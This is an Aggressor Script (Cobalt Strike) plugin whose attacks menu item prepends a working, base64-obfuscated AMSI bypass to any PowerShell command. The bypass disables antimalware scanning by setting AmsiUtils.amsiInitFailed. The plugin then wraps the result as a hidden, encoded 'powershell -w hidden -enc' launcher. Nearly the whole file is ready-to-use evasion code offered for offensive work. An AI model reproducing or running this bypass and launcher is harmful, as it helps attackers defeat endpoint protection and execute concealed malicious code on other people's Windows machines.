# Author: 0xv1n
# -------------
# ##############
# Default AMSI Bypass Methods
## example from https://github.com/HernanRodriguez1/Bypass-AMSI
## Goal is to add more or allow for user to utilize their own.
%defaultsetting['method'] = '[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==")))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=")))).SetValue($null,$true);';

sub callback {
    $prepend_bypass = $3['method'];
    $command = $3['command'];
    $ps_pmt = "powershell -w hidden -enc ";
    $concat = "$prepend_bypass $+ $command";
    $encoded = base64_encode($concat);
    # Outputs command to Script Console
    show_message("$ps_pmt $+ $encoded");
}

sub abyp-encode {
    $dialog = dialog("ASMI Stuff", %(method => %defaultsetting['method']), &callback);
    dialog_description($dialog, "Prepend AMSI Bypass to a command then Encode");
    
    drow_text($dialog, "command", "PS Command:");
    drow_text($dialog, "method",  "Prepend Bypass:");
    
    dbutton_action($dialog, "Encode");

    dialog_show($dialog);
}

# Menu Entry
popup attacks {
	item "AMSI Bypass Encoded Command" {
		abyp-encode();
	}
}   